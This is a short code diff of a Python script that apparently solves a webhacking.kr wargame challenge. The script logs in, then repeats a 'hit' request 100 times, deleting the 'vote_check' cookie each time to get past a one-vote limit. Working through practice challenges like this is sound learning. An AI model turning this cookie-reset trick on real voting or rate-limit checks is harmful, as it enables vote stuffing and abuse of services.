@@ -12,16 +12,12 @@ def login(session):
         print("login Fail")
         exit(0)
 
-
-
-
 def main():
     session = requests.Session()
     login(session)
     for i in range(100):
         response = session.get("https://webhacking.kr/challenge/code-5/?hit="+datas['id'])
         session.cookies.__delitem__("vote_check")
-
 
 if __name__=='__main__':
     main()
